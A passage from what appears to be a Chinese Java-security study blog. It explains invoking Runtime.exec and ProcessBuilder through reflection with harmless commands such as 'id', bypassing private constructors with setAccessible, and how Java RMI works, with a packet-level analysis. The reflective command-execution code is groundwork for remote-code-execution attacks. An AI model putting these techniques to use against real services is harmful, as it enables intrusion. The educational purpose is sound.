, 外部是不可见的 . 那么设计者为什么要这么做呢 ?\n​    这一种比较常见的设计模式 , 被称为 “单例模式” . 在Java从零到一（2）中学过 . 类似一个 Web 应用 , 数据库连接应该只在服务启动时建立一次 , 而不是每次访问数据库时都建立一个连接 .因此开发人员可以把数据库连接写在构造函数中 , 并赋予该函数 “private” 修饰符 . 然后编写一个静态方法来获取该连接 . 这样 , 只有在类初始化时会调用一次构造函数 , 建立数据库连接 . 后面只需要通过静态方法就能获取数据库连接 , 避免了建立多个数据库链接 .\n\n​    只需要确保实例化过程只进行一次就行了 , 以 Java 反射为例 , 在类初始化时会执行 static{} 代码块中的内容( 详见本文开头 ) , 所以会执行一遍实例化过程 . 由于该过程被赋予了 “private” 修饰符 , 所以后面就再也不能访问它了 . 结果是一样的 .\n​    这里也引出了 class.newInstance() 方法执行成功的两个关键点 :\n1.类必须要有无参构造函数 .\n2.类的构造函数不能是私有的 , 也就是不能通过 “private” 修饰符来修饰构造函数 .\n​    有了这些结论 , 我们就可以通过 Java 反射机制来执行 exec() 方法了 .\n//java.lang.Runtimeimport java.io.BufferedReader;import java.io.IOException;import java.io.InputStream;import java.io.InputStreamReader;import java.lang.reflect.Constructor;import java.lang.reflect.InvocationTargetException;import java.lang.reflect.Method;public class Runtime &#123;    public Runtime() &#123;    &#125;    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException &#123;        Class&lt;?&gt; cls = Class.forName(&quot;java.lang.Runtime&quot;);//        System.out.println(&quot;通过Class.forname()方法获取任意类：&quot;+cls);//        //className.getMethods()//        System.out.println(&quot;getMethods获取方法:&quot;);//        Method[] methods = cls.getMethods();//        for (Method m : methods) &#123;//            System.out.println(m);//        &#125;//        //className.getDeclaredMethods()//        System.out.println(&quot;\\ngetDeclaredMethods获取的方法&quot;);//        Method[] declareMethods = cls.getDeclaredMethods();//        for (Method m : methods) &#123;//            System.out.println(m);//        &#125;////        newInstance nis = (newInstance)cls.getDeclaredConstructor().newInstance();//        Object obj = cls.getMethod(&quot;exec&quot;, String.class).invoke(nis,&quot;id&quot;);        /*        这里是不能执行成功的因为在Runtime类中有private修饰的静态方法        若想成功必须：1、类必须要有无参构造函数。2、类的构造函数不能私有         */        Method mGetRuntime = cls.getMethod(&quot;getRuntime&quot;);        Method mExec = cls.getMethod(&quot;exec&quot;, String.class);        Object obj = mGetRuntime.invoke(null);        Process p = (Process) mExec.invoke(obj, &quot;id&quot;);        //标准输出当作输入字节流        InputStream is = p.getInputStream();        //字节流转换为字符流        InputStreamReader isr = new InputStreamReader(is);        //提供缓冲区        BufferedReader br = new BufferedReader(isr);        String line = null;        while ((line = br.readLine()) != null) &#123;            System.out.println(line);        &#125;    &#125;&#125;\n\n​    \n​    成功通过 java.lang.Runtime.getRuntime().exec() 调用系统命令 id .\n通过 Method mGetRuntime = cls.getMethod(“getRuntime”); 和 Method mExec = cls.getMethod(“exec”,String.class); 分别获取 getRuntime() 方法和 exec() 方法.\n通过 getRuntime() 的 invoke(null) 方法获取 Runtime 实例对象 . 由于调用的是静态方法 , 所以省略 obj 参数 , 由于 getRuntime() 方法没有参数 , 所以这里参数数组为 null .\n通过 exec() 的 invoke(obj , args[]) 方法来执行命令 . 这里 obj 是 Runtime 实例对象 , 通过上一步骤获得 , 参数则为系统命令 “id” .\n获取执行结果的字节流 , 将其处理成字符流 , 最后输出字符串 .\n\n关于 Object obj = mGetRuntime.invoke(null); 这个点需要补充一些东西.\n\n\n​    这里为什么 invoke() 的方法参数为什么是一个类( Class ) ？\n​    可以通过 对象.方法名 来调用实例方法 , 类名.方法名 来调用静态方法 , 那么反过来 , 方法名.invoke(对象) 不就可以映射成 方法名.invoke(类) 嘛\n\n\nJava.lang.ProcessBuilder​    提到了可以通过 java.lang.Runtime.getRuntime().exec() 方法执行系统命令 , 那么去看看exec() 方法是如何执行系统命令的 ?\n​    看看源码，看最简单的重载形式\n\n​    该方法返回类对 exec() 方法的调用 , 那么这里返回的 exec() 方法是什么样的呢 ?\n\n​    cmdarray : 一个字符串数组 , 包含要执行命令及参数 .\n​    envp : 一个字符串数组 , 其中的每个元素都是键值对格式的环境变量 , 如果子进程继承当前进程的环境变量设置 , 则该值为 null.\n​    dir : 一个文件对象 , 代表子进程的工作目录 . 如果子进程继承当前进程的工作目录 , 则该值为 null.\n​    可以看出 , exec()方法执行命令的原理是通过 ProcessBuilder 对象创建了一个执行命令的子进程 . 那么是否可以直接通过 ProcessBuilder 类来执行命令呢 ?\n\n​    因为并没有指定 envp 和 dir 两个参数的值 , 因此不需要关注 environment() 和 directory() 这两个方法 , 直接来看 start() 方法 .\n\n​    看看大概意思是转换 cmdarray 数组，提取其中要执行的命令，判断该命令是否可以执行。并且判断命令是否存在对应参数，然后进行子进程的创建。\n​    那根据这个意思，我们只需要调用 java.lang.ProcessBuilder.start() 方法 , 就可以创建子进程来执行命令了 .\n执行不带参数的系统命令import java.io.BufferedReader;import java.io.IOException;import java.io.InputStream;import java.io.InputStreamReader;import java.lang.reflect.InvocationTargetException;import java.lang.reflect.Method;import java.util.Arrays;import java.util.List;public class processBuilder &#123;    public processBuilder()&#123;&#125;    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException &#123;        Class&lt;?&gt; cls = Class.forName(&quot;java.lang.ProcessBuilder&quot;);        //下面需要构造 ProcessBuilder 类的实例对象        //但是 ProcessBuilder 的构造函数都是有参构造函数，所以不能使用 class.newInstance()来构造实例对象        //注意，构造方法的参数 cmdarray 的类型是 List        Object obj = cls.getConstructor(List.class).newInstance(List.of(&quot;id&quot;));        Method startCmd = cls.getMethod(&quot;start&quot;);        //执行start()方法        Process p = (Process) startCmd.invoke(obj);        //将进程p的标准输出流转化为输入字节流        InputStream is = p.getInputStream();        //字节流转化为字符流        InputStreamReader isr = new InputStreamReader(is);        BufferedReader br = new BufferedReader(isr);        String line = null;        while ((line=br.readLine())!=null)&#123;            System.out.println(line);        &#125;    &#125;&#125;\n\n\n​    通过 class.getConstructor( parameterType ).newInstance(“parameter”) 来调用含有参数parameter的构造函数\n​    由于 cmdarray 参数的类型是 List , 所以我们执行的命令的类型也必须是 List , 此时可以用 Arrays.asList() 方法将一个可变长参数或者数组转换成 List 类型 .\n​    由于 start() 方法没有参数 , 所以直接调用 Method.invoke(obj) 就可以了\n执行携带参数的系统命令​    那么如何执行携带参数的系统命令呢 ?\n​    其实一共有两种方法来执行携带参数的系统命令 . 下面分别来说一下 .\n\npublic ProcessBuilder(List command)\n这里还是通过 Arrays.asList() 方法 . 由于该方法的参数可以是一个可变长参数 , 所以我们可以直接把携带参数的系统命令写到一个数组中 , 然后通过该方法转换成列表 .\n\n\nimport java.io.BufferedReader;import java.io.IOException;import java.io.InputStream;import java.io.InputStreamReader;import java.lang.reflect.InvocationTargetException;import java.lang.reflect.Method;import java.util.Arrays;import java.util.List;public class processBuilder2 &#123;    public processBuilder2()&#123;&#125;    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException &#123;        Class&lt;?&gt; cls = Class.forName(&quot;java.lang.ProcessBuilder&quot;);        Method startCmd = cls.getMethod(&quot;start&quot;);        Object obj = cls.getConstructor(List.class).newInstance(Arrays.asList(&quot;uname&quot;,&quot;-a&quot;));        //执行start()方法        Process p = (Process) startCmd.invoke(obj);        //将进程p的标准输出流转化为输入字节流        InputStream is = p.getInputStream();        //字节流转化为字符流        InputStreamReader isr = new InputStreamReader(is);        BufferedReader br = new BufferedReader(isr);        String line = null;        while ((line=br.readLine())!=null)&#123;            System.out.println(line);        &#125;    &#125;&#125;\n\n\n​    这样就能成功执行携带参数的系统命令了 .\n\npublic ProcessBuilder(String… command)\n\n​    这是上文所说的 ProcessBuilder 类的第二个构造函数 , 也就是专门用于执行携带参数的系统命令的构造函数 .\n\n​    可以看到 , 该构造方法的参数是也是一个可变长参数 . 可变长参数代表着不定长度的参数 , 例如 String … parameter 代表参数 parameter 由不定个数的字符串组成 .\n​    Java在编译时会将可变长参数编译成一个数组 . 所以下面两种写法是完全等价的 .\n​    public void test(String[] names)等价于public void test(String … names)\n​    因此 , 我们可以将 String[].class 作为参数传递给 getConstructor() 方法 , 告诉 ProcessBuilder 调用第二个构造方法来处理携带参数的系统命令 .\n​    这里其他大佬给出了范例\n\n​        我们在刚刚的代码上修改\nimport java.io.BufferedReader;import java.io.IOException;import java.io.InputStream;import java.io.InputStreamReader;import java.lang.reflect.InvocationTargetException;import java.lang.reflect.Method;import java.util.Arrays;import java.util.List;public class processBuilder3 &#123;    public processBuilder3()&#123;&#125;    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException &#123;        Class&lt;?&gt; cls = Class.forName(&quot;java.lang.ProcessBuilder&quot;);        Method startCmd = cls.getMethod(&quot;start&quot;);        Object obj = cls.getConstructor(String[].class).newInstance(new String[][]&#123;&#123;&quot;uname&quot;,&quot;-a&quot;&#125;&#125;);        //执行start()方法        Process p = (Process) startCmd.invoke(obj);        //将进程p的标准输出流转化为输入字节流        InputStream is = p.getInputStream();        //字节流转化为字符流        InputStreamReader isr = new InputStreamReader(is);        BufferedReader br = new BufferedReader(isr);        String line = null;        while ((line=br.readLine())!=null)&#123;            System.out.println(line);        &#125;    &#125;&#125;\n\n\n如何调用类的私有方法​    这个问题其实之前就遇到过了，在通过 java.lang.Runtime 执行系统命令时 , 由于该类的构造方法 Runtime() 是一个私有方法 , 所以我们不能调用该方法 , 只能通过 getRuntime() 静态方法来返回一个 Runtime 实例对象 , 然后再调用 exec() 方法 . 为此还提到了 “ 单例模式 “ 这种设计模式 .\n​    也就是说 , 我们无法直接获取到私有构造方法的 . 那么是否有其他方法来获取私有构造方法 ?\n​    java.lang.reflect.AccessibleObject.class 中存在这么一个方法 : setAccessible(boolean flag)\n​    来看下官方文档中是怎么定义这个方法的 .\n\n​    从中我们可以知道 , 当该方法的参数被设置为 True 时 , 会取消 Java 语言访问检查 , 也就是取消对 public , protected , private 等修饰符的检查 .\n​    但是 , 如果对象是 java.lang.Class.Constructor , 那么将会抛出异常 . 也就是说 , 我们不能通过 getConstructor() 方法来获取构造方法 .这是为什么呢 ? 其实很好理解 , 与 getMethods() 和 getDeclaredMethods() 一个道理 , getConstructor() 方法只能获取当前类与其继承类的公用( public )方法 . 而不能获取私有方法 .\n​    而我们现在需要获取的方法( Runtime() )是私有方法 , 自然不能通过 getConstructor() 方法来获取 .那怎么办呢 ? 其实我们可以使用 getDeclaredConstructor() 方法 .\n\n​    该方法与 getConstructor() 方法最大的不同点在于 : 这个方法会返回指定参数类型的所有构造方法 . 包括 public , protected 以及 private 修饰符修饰的 .\n​    而 getConstructor() 方法只会返回所有构造方法的一个子集 , 即 public 修饰符修饰的 .\n​    因此 , 通过 getDeclaredConstructor() 方法 , 我们可以获取到私有构造方法 Runtime() . 并且 , 通过setAccessible(boolean flag)关闭 Java 语言访问检查时也不会再抛出异常 .\n//java.lang.Runtimeimport java.io.BufferedReader;import java.io.IOException;import java.io.InputStream;import java.io.InputStreamReader;import java.lang.reflect.Constructor;import java.lang.reflect.InvocationTargetException;import java.lang.reflect.Method;public class Runtime &#123;    public Runtime() &#123;    &#125;    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException &#123;        Class&lt;?&gt; cls = Class.forName(&quot;java.lang.Runtime&quot;);//        System.out.println(&quot;通过Class.forname()方法获取任意类：&quot;+cls);        //className.getMethods()        System.out.println(&quot;getMethods获取方法:&quot;);        Method[] methods = cls.getMethods();        for (Method m : methods) &#123;            System.out.println(m);        &#125;        //className.getDeclaredMethods()        System.out.println(&quot;\\ngetDeclaredMethods获取的方法&quot;);        Method[] declareMethods = cls.getDeclaredMethods();        for (Method m : methods) &#123;            System.out.println(m);        &#125;//        newInstance nis = (newInstance)cls.getDeclaredConstructor().newInstance();//        Object obj = cls.getMethod(&quot;exec&quot;, String.class).invoke(nis,&quot;id&quot;);        Method mGetRuntime = cls.getMethod(&quot;getRuntime&quot;);        Method mExec = cls.getMethod(&quot;exec&quot;, String.class);        Object obj = mGetRuntime.invoke(null);        Process p = (Process) mExec.invoke(obj, &quot;id&quot;);        /*        通过 getDeclaredConstructor() 方法 ,        我们可以获取到私有构造方法 Runtime() .        并且 , 通过setAccessible(boolean flag)        关闭 Java 语言访问检查时也不会再抛出异常         */        Constructor&lt;?&gt; cst = cls.getDeclaredConstructor();        cst.setAccessible(true);        Object obj2 = cst.newInstance();        Process p2 = (Process) mExec.invoke(obj2, &quot;id&quot;);        //标准输出当作输入字节流        InputStream is2 = p2.getInputStream();        //字节流转换为字符流        InputStreamReader isr2 = new InputStreamReader(is2);        //提供缓冲区        BufferedReader br2 = new BufferedReader(isr2);        String line2 = null;        while ((line2 = br2.readLine()) != null) &#123;            System.out.println(line2);        &#125;    &#125;&#125;\n\n\n​    通过 getDelclaredConstructor() 方法获取到 Runtime() 构造方法 , 关闭 Java 语言访问检查 , 然后构建实例对象 . 最后通过 Method.invoke(obj , parameter) 调用 exec() 方法 .\n​    通过这种方法 , 就可以直接访问任意类的私有构造方法了.\n​    RCE就总结这么多，持续学习 . 感谢各位大牛的资料\n","categories":["Java安全基础篇"],"tags":["开发","Java","安全","反射","RCE"]},{"title":"Java安全从零到一(7)-Java RMI相关","url":"/2023/01/30/Java%E5%AE%89%E5%85%A8%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80-7-Java-RMI%E7%9B%B8%E5%85%B3/","content":"Java RMI​    一部分记录 Java RMI 的原理/流程 , 一部分记录 Java RMI 的利用手段/攻击技巧\n什么是Java RMI​    RMI ( Remote Method Invocation , 远程方法调用 ) 能够让在某个 Java虚拟机上的对象像调用本地对象一样调用另一个 Java虚拟机 中的对象上的方法 , 这两个 Java虚拟机 可以是运行在同一台计算机上的不同进程, 也可以是运行在网络中不同的计算机上 .\n为什么有Java RMI​    先思考下面这几个问题 :\n1. 假设服务端上存在很多对象及方法：​        客户端上有程序想要调用服务端上某个对象的方法 . 于是客户端会发出请求 . 但是**服务端不可能将自己所有的对象与方法都发送给客户端 , 也不可能让客户端任意调用自己每一个对象与方法 . 一旦这样做 , 服务端的安全性将会受到极大的挑战 **\n2. 假设服务端确定了远程调用的资源:​        客户端开始访问需要的对象与方法 , 我们都知道 Java 调用本地对象方法的过程是下面这样的 .\nObjectClassA objectA = new ObjectClassA();String ret = objectA.MethodA();\n\n​        此时我们知道类名是 ObjectClassA , 实例对象是 objectA , objectA 存在方法 MethodA() .\n​        但是在远程调用的过程中 , 如果 ObjectA 在 JVMA 上 , 我们执行的程序在 JVMB 上 . 那对于我们的程序来说 , 是不知道 JVMA 上创建的实例对象叫什么的 . 即使知道了实例对象叫什么 , 那么下次程序一修改 , 实例对象的名称很有可能会变化 , 这样我们的程序又无法远程访问了 .\n​        此时问题就产生了 , 实例对象的名称是可以随意改变的 , 但是在远程调用时 , 我们更希望目标的名称是固定的 , 这样我们就能在不修改任何代码的情况下调用远程对象了 .\n3. 假设客户端找到了想要的资源:​        此时客户端准备调用目标对象, 并将结果返回 .\n​        现在存在一个问题 : 连接两端必须要确保数据在发送和返回的途中不会遭到破坏 .\n​        我们要知道 : 客户端访问的资源不是预定义的基本数据类型 , 而是完整的对象 . 如果先将对象分解成基本数据类型 , 再传输这些基本数据类型的数据 , 最后再将这些基本数据类型拼接成对象 . 即使转换过程中没有数据丢失 , 代码的复杂度也是一个很大的挑战 .\n4. 假设客户端找到了一个合适的传输方法​        程序终于要开始进行远程调用了, 然而问题还没完 . 在大型项目中 , 程序可能需要频繁的进行远程调用 , 开发人员不可能为每次调用设计一套专门的调用方法 , 这样不仅耗时耗力 , 还很容易出错 .\n​        开发人员更希望有一个统一且规范的接口 , 能在添加尽可能少的代码的前提下 , 完成所有的远程调用 .\n\n​    此时 JAVA RMI 出现了 , 通过它可以解决上述的所有问题 .\nJava RMI的流程​    在上面给出了一张JavaRMI的流程图，我们看看具体是如何解决的\n​    如果让客户端直接访问服务端的资源 , 那么有可能出现越权访问的风险 . 在 JAVA RMI 中 , 通过一个 中间人 来解决这类问题 .\n​    服务端( RMIServer ) 会将自己提供的服务的实现类交给这个中间人 , 并公开一个名称 . 任何客户端( RMIClient )都可以通过公开的名称找到这个实现类 , 并调用它 .\n​    这样以来 , 不仅避免了客户端和服务端资源的直接交互 . 也使得客户端能更好的查找要使用的对象( 直接去询问这个中间人 , 若中间人拥有对应实现类 , 那么客户端可以在本地直接调用该类的方法 . 若中间人没有对应的实现类 , 则说明服务端没有提供相应服务 )\n​    这个中间人也被称为 RMIService / RMIRegister .\n​    因此整个 RMI 的流程实际上分为三个部分 , RMIServer , RMIClient , RMIRegister . 其交互的流程如下所示 :\n\n服务端下面尝试代码实现：\n 1.服务端定义一个远程接口\npackage rmi.server;import java.rmi.Remote;import java.rmi.RemoteException;public interface Hello extends Remote &#123;    String sayHello(String name) throws RemoteException;&#125;\n\n​    既然 RMIServer 要提供服务 , 那么它一定会准备一个接口 , 让客户端通过这个接口来访问服务 .\n​    在 Java 中 , 如果一个类继承了 java.rmi.Remote 接口 , 那么该类将成为一个服务端的远程对象 , 供客户端访问并提供一定的服务 .\n​    Remote 接口是一个标识接口 , 本身不包含任何方法 , 该接口用于标识其子类的方法可以被非本地的Java虚拟机调用\n​    由于远程调用的本质依旧是 “ 网络通信 “ . 而网络通信是经常出现异常的 . 因此 , 继承 Remote 接口的接口的所有方法必须要抛出 RemoteException 异常 . 事实上 , RemoteException 也是继承于 IOException 的 .\n2. 服务端调用远程接口的实现类\n//远程接口的实现类package rmi.server;import java.rmi.RemoteException;import java.rmi.server.UnicastRemoteObject;public class HelloImpl extends UnicastRemoteObject implements Hello &#123;    private static final long serialVersionUID = 1L;    public HelloImpl() throws RemoteException &#123;        super();    &#125;    @Override    public String sayHello(String name) throws RuntimeException &#123;        return &quot;Hello, &quot; + name;    &#125;&#125;\n\n​    实现类必须要继承 UnicastRemoteObject 类 \n​    只有当接口的实现类继承了 UnicastRemoteObject 类 , 客户端访问获得远程对象时 , 远程对象才将会把自身的一个拷贝以 Socket 的形式传输给客户端，这个拷贝也就是 Stub , 或者叫做 “ 存根 “ .\n​    准确的说 , java.rmi.server.UnicastRemoteObject 类的构造函数将生成 Stub 和 Skeleton . 而继承该类的子类将会在实例化时自动执行父类的构造函数 , 从而也生成 Stub 和 Skeleton .\n​    这个 Stub 可以看作是远程对象在本地的一个代理 , 其中包含了远程对象的具体信息 . 客户端可以通过这个代理与服务端进行交互 .\n​    Skeleton 也叫做 “ 骨架 “ , 可以看作是服务端的一个代理 , 用来处理 Stub 发来的请求 , 然后去调用客户端真正需求的方法 , 然后再将方法执行结果返回给 Stub .\n​    其实 , 与其说是客户端和服务端进行交互 , 不如说是 客户端代理( Stub ) 和 服务端代理( Skeleton ) 在进行交互 .\n​    但是为什么一直没有提到这个 Skeleton 呢 ? 因为在 JDK1.2 以后的 RMI 中 , 可以通过反射API 直接将请求发送给真实类 , 不再需要 Skeleton 来做中转了\n​    该实现类实现了远程接口中的 sayHello() 方法 .\n3. 开启 RMIRegister 并在上面注册远程对象 , 并向客户端提供对应的服务了 .\n//服务端注册package rmi.server;import java.net.MalformedURLException;import java.rmi.Naming;import java.rmi.RemoteException;import java.rmi.registry.LocateRegistry;public class HelloServer &#123;    public static void main(String[] args) &#123;        try &#123;            Hello h = new HelloImpl();            LocateRegistry.createRegistry(1099);            Naming.rebind(&quot;rmi://localhost:1099/hello&quot;, h);            System.out.println(&quot;HelloServer 成功启动&quot;);        &#125; catch (RemoteException | MalformedURLException e) &#123;            e.printStackTrace();        &#125;    &#125;&#125;\n\n​    Hello h = new HelloImpl(); : 上文提到过, HelloImpl 对象在实例化时会自动调用其父类 UnicastRemoteObject 的构造方法 , 生成对应的 Stub 和 Skeleton . 由于 Skeleton 已经不再需要 , 所以这里仅会返回 Stub 的引用 .\n​    上文也曾提到 : JAVA RMI 由三个部分组成 , 分别是 RMIClient , RMIServer , RMIService . 其中 RMIService 可以放在单独的 Java 虚拟机中启动 , 也可以通过 RMIServer 来启动 . 在正常的开发环境中 , 基本不会给 RMIService 一个单独的运行环境的 , 往往是通过 RMIServer 来启动的 .\n​    LocateRegistry.createRegistry(1099); : 即在本地创建并启动 RMIService , 被创建的 RMIService 服务将会在指定的端口上监听请求 .\n​    RMIService ( RMIRegister ) 服务的默认端口为 : 1099\n​    java.rmi.Naming 类提供在对象注册表中存储和获得远程对远程对象引用的方法 . 这里将远程对象 “ h “ 绑定到 rmi://localhost:1099/hello 这个 URL 上 . 客户端可以通过这个 URL 直接访问远程对象 .\n​    这里涉及到了另一个问题 : 即 “ 开发人员不知道远程实例对象的名称是什么 .” 而通过这种绑定机制 , 开发人员仅需要知道一个公开的路径(URL) , 就可以直接访问到对应的远程对象了 .\n​    至此 , 服务端的配置已经结束了 , RMIServer 将提供的服务注册在了 RMIService 上 , 并且公开了一个固定的路径 , 供客户端访问 .\n客户端配置//客户端注册package rmi.client;import java.net.MalformedURLException;import java.rmi.Naming;import java.rmi.NotBoundException;import java.rmi.RemoteException;import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;import rmi.server.Hello;public class HelloClient &#123;    public static void main(String[] args) &#123;        try &#123;            // 获取服务注册器            Registry registry = LocateRegistry.getRegistry(&quot;localhost&quot;, 1099);            // 获取所有注册的服务            String[] list = registry.list();            for (String i : list) &#123;                System.out.println(&quot;已经注册的服务：&quot; + i);            &#125;            Hello h = (Hello) Naming.lookup(&quot;rmi://localhost:1099/hello&quot;);            String test = h.sayHello(&quot;mes9s0&quot;);            System.out.println(test);        &#125; catch (MalformedURLException e) &#123;            System.out.println(&quot;url格式异常&quot;);        &#125; catch (NotBoundException e) &#123;            System.out.println(&quot;对象未绑定&quot;);        &#125; catch (RemoteException e) &#123;            System.out.println(&quot;创建对象异常&quot;);            e.printStackTrace();        &#125;    &#125;&#125;\n\n​    客户端只需要调用 java.rmi.Naming.lookup 函数 , 通过公开的路径从 RMIService 上拿到对应接口的实现类 , 拿到实现类后 , 在通过本地接口即可调用远程对象的方法 .\n​    因此 , 只需要一个接口 , 一个客户端连接程序 , 即可实现 JAVA 远程调用 .\nJava RMI执行过程​    我们先看看目录结构\n\n​    client中: Hello为 Java RMI服务接口；HelloClient为 Java RMI客户端连接程序\n​    server中: Hello为 Java RMI服务接口; HelloImpl为 Java RMI服务接口实现类; HelloServer为 Java RMI服务端程序，启动RMIService\n处理服务端源代码 **javac /Applications/Code/JavaRMI/src/rmi/server/*.java**\n\n\n\n​    然后利用 java 自带 rmic 工具生成 Stub 存根 .\n​    注意 : rmic的路径必须要与源码中一致 . 比如源码中为 : package rmi.server , 那么此处 rmic 必须以 rmi.server 开头，如果不是的话，会报错\n\n\n处理客户端源码​    javac rmi/client/*.java\n\n\n​    我们把服务端生成的stub存根复制到客户端目录下\n\n\n​    现在代码都已经处理完毕 , 下面先运行 RMIServer , RMIServer 会自动开启 RMIService 并在上面注册对应的服务 , 然后再运行 RMIClient , 即可完成 JAVA 远程方法调用 .\n\n完成Java远程方法调用​    先运行 RMIServer\n\n​    然后再运行client，我们就成功实现了RMI调用\n\nWireshark抓包分析请求数据流​    在wireshark中，我们可以看到所有的数据流\n​    tcp.stream eq 33\n\n​    下面分析一下步骤\n1. **首先是TCP三次握手**\n\n\n​    注意 : 此时访问的目标端口是 1099 , 即我们指定的 RMISerivce 端口 . 然而最终我们调用远程方法时 , 需要去访问 RMIServer . 但 Stub 中保存的是 RMIService 的端口和地址 , RMIServer 的端口和地址我们是不知道的 .\n​    因此 , RMIService 肯定会将 RMIServer 的端口和地址告诉我们 , 供我们进行远程方法调用 .\n\n接下来应该是一个 RMIService 的确认工作.\n\n\n​    这里 RMIService 返回了客户端的IP地址和端口 , 应该是用于确认要进行 RMI 服务的是否是 RMIClient .\n​    如果 RMIClient 作出了响应, 则代表 RMIClient 的确需要 RMI 服务 .\n\n然后是一个 RMIClient 的确认工作.\n\n\n​    经过 RMIClient, RMIService 双方的确认工作后, 初始化工作就完成了, 接下来是数据传输阶段.\n\n要进行数据传输, 仅有IP还不够 , 只有同时拥有 IP地址和端口号才能访问 RMIServer . 因此 RMIClient 告诉 RMIClient 需要访问的类名( Hello.class ) , 然后 RMISerivce 把 RMIServer 的端口号告诉 RMIClient\n\n\n可以看到 RMIClient 请求了 Hello.class 类 , 并且将数据参数通过序列化字符串的方式传输 . \n\n​    首先将在 Wireshark 里追踪 TCP 数据流 , 然后选择以 RAW 格式显示数据 .\n\n​    50代表RMI Call请求数据包\n\n​    AC ED 00 05不陌生了，上一篇刚讲过，是Java序列化字符串16进制特征码\nRMI Call - 0x50STREAM_MAGIC - 0xac edSTREAM_VERSION - 0x00 05Contents  TC_BLOCKDATA - 0x77    Length - 34 - 0x22    Contents - 0x000000000000000000000000000000000000000000000000000244154dc9d4e63bdf  TC_STRING - 0x74    newHandle 0x00 7e 00 00    Length - 5 - 0x00 05    Value - hello - 0x68656c6c6f\n\n​    然后就是 ReturnData 的数据包了 \n​    51 代表 RMI ReturnData 数据包 .\nRMI ReturnData - 0x51STREAM_MAGIC - 0xac edSTREAM_VERSION - 0x00 05Contents  TC_BLOCKDATA - 0x77    Length - 15 - 0x0f    Contents - 0x01ca0812f0000001878fe922768006  TC_OBJECT - 0x73    TC_PROXYCLASSDESC - 0x7d      newHandle 0x00 7e 00 00      Interface count - 2 - 0x00 00 00 02      proxyInterfaceNames        0:          Length - 15 - 0x00 0f          Value - java.rmi.Remote - 0x6a6176612e726d692e52656d6f7465        1:          Length - 16 - 0x00 10          Value - rmi.server.Hello - 0x726d692e7365727665722e48656c6c6f      classAnnotations        TC_NULL - 0x70        TC_ENDBLOCKDATA - 0x78      superClassDesc        TC_CLASSDESC - 0x72          className            Length - 23 - 0x00 17            Value - java.lang.reflect.Proxy - 0x6a6176612e6c616e672e7265666c6563742e50726f7879          serialVersionUID - 0xe1 27 da 20 cc 10 43 cb          newHandle 0x00 7e 00 01          classDescFlags - 0x02 - SC_SERIALIZABLE          fieldCount - 1 - 0x00 01          Fields            0:              Object - L - 0x4c              fieldName                Length - 1 - 0x00 01                Value - h - 0x68              className1                TC_STRING - 0x74                  newHandle 0x00 7e 00 02                  Length - 37 - 0x00 25                  Value - Ljava/lang/reflect/InvocationHandler; - 0x4c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b          classAnnotations            TC_NULL - 0x70            TC_ENDBLOCKDATA - 0x78          superClassDesc            TC_NULL - 0x70    newHandle 0x00 7e 00 03    classdata      java.lang.reflect.Proxy        values          h            (object)              TC_OBJECT - 0x73                TC_CLASSDESC - 0x72                  className                    Length - 45 - 0x00 2d                    Value - java.rmi.server.RemoteObjectInvocationHandler - 0x6a6176612e726d692e7365727665722e52656d6f74654f626a656374496e766f636174696f6e48616e646c6572                  serialVersionUID - 0x00 00 00 00 00 00 00 02                  newHandle 0x00 7e 00 04                  classDescFlags - 0x02 - SC_SERIALIZABLE                  fieldCount - 0 - 0x00 00                  classAnnotations                    TC_NULL - 0x70                    TC_ENDBLOCKDATA - 0x78                  superClassDesc                    TC_CLASSDESC - 0x72                      className                        Length - 28 - 0x00 1c                        Value - java.rmi.server.RemoteObject - 0x6a6176612e726d692e7365727665722e52656d6f74654f626a656374                      serialVersionUID - 0xd3 61 b4 91 0c 61 33 1e                      newHandle 0x00 7e 00 05                      classDescFlags - 0x03 - SC_WRITE_METHOD | SC_SERIALIZABLE                      fieldCount - 0 - 0x00 00                      classAnnotations                        TC_NULL - 0x70                        TC_ENDBLOCKDATA - 0x78                      superClassDesc                        TC_NULL - 0x70                newHandle 0x00 7e 00 06                classdata                  java.rmi.server.RemoteObject                    values                    objectAnnotation                      TC_BLOCKDATA - 0x77                        Length - 55 - 0x37                        Contents - 0x000a556e6963617374526566000e3139322e3136382e31382e3232380000c656695511efcb8970d2ca0812f0000001878fe92276800101                      TC_ENDBLOCKDATA - 0x78                  java.rmi.server.RemoteObjectInvocationHandler                    values      &lt;Dynamic Proxy Class&gt;\n\n​    我们把最后的contents内容拿去解码\n\n​    这是RMIServer的地址和端口号\n5. **现在 RMIClient 已经知道 RMIServer 的IP地址和端口号 , 可以直接去访问 RMIServer 上对应类的方法了 . 下面进行一些收尾工作 , 就将结束了该 TCP 数据流 .**\n\n\n内容数据流1. **首先依旧是 TCP 三次握手 . **\n\n\n​    注意此时IP 地址已经是刚才获取到的 192.168.18.228 了 , 访问的端口也是 RMIServer 的端口 50774 .\n\n然后又是一个验证过程\n\n\n\n紧接上一步 , RMIClient 在作出回应的同时 , 立刻请求 127.0.1.1 , 并且调用了 Java.rmi 包中的一些类\n\n\n\n接下来完成的是RMI Call - RMI ReturnData的流程\n\n\n\n在完成这一步后 , RMIClient将会把参数传输给 RMIServer , RMIServer 在本地执行后返回结果\n将参数 mes9s0 传输给 RMIServer\n\n\n\n​    RMIServer 将参数 mes9s0带入 sayHello() 函数执行后 , 将结果返回给 RMIClient\n\n​    成功调用远程调用 sayHello() 方法 .\n\n然后进行一些收尾工作 , 并结束整个 JAVA RMI 过程 .\n\n\n一个完整的 JAVA 远程方法调用流程就结束了\n","categories":["Java安全基础篇"],"tags":["开发","Java","安全","RMI"]},{"title":"Linux基础从零到一(1)","url":"/2022/05/11/Linux%E5%9F%BA%E7%A1%80%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80-1/","content":"​    本系列为个人基础知识补全以及为后续方便查找开设，里面会包括由于Linux基础知识的相关内容…\n系统调用过程\n\n\nLinux基本操作init 3 or 